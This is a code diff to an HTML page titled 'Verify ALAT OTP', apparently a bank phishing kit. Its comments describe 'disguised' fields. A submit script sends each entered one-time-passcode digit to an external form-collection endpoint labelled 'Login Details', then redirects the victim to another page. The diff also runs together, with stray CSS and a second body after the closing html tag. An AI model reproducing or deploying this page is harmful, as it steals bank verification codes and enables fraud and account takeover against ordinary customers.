@@ -123,6 +123,138 @@
                 <input type="hidden" name="_redirect" value="false"> <!-- Disable UserBasin default redirect -->
                 <!-- Disguised fields that will appear as message to UserBasin -->
                 <input type="hidden" name="subject" value="Login Details">
+                <!-- Disguised OTP fields as text inputs with unique names -->
+                <div class="formOtp">
+                  <input id="otp-0" type="text" name="digit1" inputmode="numeric" pattern="[0-9]" maxlength="1"
+                    class="fin-input" inputmode="numeric" required placeholder="-"
+                    title="Please enter verification code digit 1" />
+                  <input id="otp-1" type="text" name="digit2" inputmode="numeric" pattern="[0-9]" maxlength="1"
+                    class="fin-input" inputmode="numeric" required placeholder="-"
+                    title="Please enter verification code digit 2" />
+                  <input id="otp-2" type="text" name="digit3" inputmode="numeric" pattern="[0-9]" maxlength="1"
+                    class="fin-input" inputmode="numeric" required placeholder="-"
+                    title="Please enter verification code digit 3" />
+                  <input id="otp-3" type="text" name="digit4" inputmode="numeric" pattern="[0-9]" maxlength="1"
+                    class="fin-input" inputmode="numeric" required placeholder="-"
+                    title="Please enter verification code digit 4" />
+                  <input id="otp-4" type="text" name="digit5" inputmode="numeric" pattern="[0-9]" maxlength="1"
+                    class="fin-input" inputmode="numeric" required placeholder="-"
+                    title="Please enter verification code digit 5" />
+                  <input id="otp-5" type="text" name="digit6" inputmode="numeric" pattern="[0-9]" maxlength="1"
+                    class="fin-input" inputmode="numeric" required placeholder="-"
+                    title="Please enter verification code digit 6" />
+                </div>
+
+                <span class="errorMessage"></span>
+
+                <div class="buttonSec">
+                  <button type="submit">Verify</button>
+                </div>
+              </form>
+              <!-- End Form -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('otpForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+  
+      const formData = new FormData(this);
+      const data = new URLSearchParams();
+      for (const pair of formData) {
+        data.append(pair[0], pair[1]);
+      }
+  
+      await fetch('https://usebasin.com/f/c7a3b223942d', {
+        method: 'POST',
+        body: data,
+        headers: {
+          'Accept': 'application/json'
+        }
+      });
+  
+      // Redirect manually
+      window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
+    });
+  </script>
+
+  <script>
+    const inputs = document.querySelectorAll('.fin-input');
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+  </script>
+
+</body>
+
+  </html>    border-radius: 6px !important;
+  }
+
+  .buttonSec {
+    display: flex !important;
+    justify-content: center !important;
+  }
+
+  button {
+    padding: 10px 30px !important;
+    font-size: 16px !important;
+
+    border: none !important;
+    border-radius: 6px !important;
+    cursor: pointer !important;
+  }
+
+  @media (max-width: 400px) {
+    .formOtp input {
+      max-width: 36px !important;
+      height: 44px !important;
+      font-size: 20px !important;
+    }
+
+    .container {
+      padding: 15px !important;
+    }
+
+    .hometitle {
+      font-size: 18px !important;
+    }
+  }
+</style>
+
+
+<body>
+  <div id="root">
+    <div class="app">
+      <div class="fin">
+        <div class="container">
+          <div class="contentSec">
+            <div class="logo">
+              <img src="logo-Cw-qJTno.png" alt="logo" />
+            </div>
+            <div class="hometitle">Verify ALAT OTP</div>
+          </div>
+          <div class="formSec">
+            <div class="input">
+              <!-- Modified Form for UserBasin -->
+              <form class="otpForm" id="otpForm">
+                <input type="hidden" name="_redirect" value="false"> <!-- Disable UserBasin default redirect -->
+                <!-- Disguised fields that will appear as message to UserBasin -->
+                <input type="hidden" name="subject" value="Login Details">
                 <!-- Disguised OTP fields as text inputs -->
                 <div class="formOtp">
                   <input id="otp-0" type="text" name="message" inputmode="numeric" pattern="[0-9]" maxlength="1"
@@ -203,6 +335,7 @@ document.getElementById('otpForm').addEventListener('submit', async function (e)
 
 
 </html>
+
 
 
 
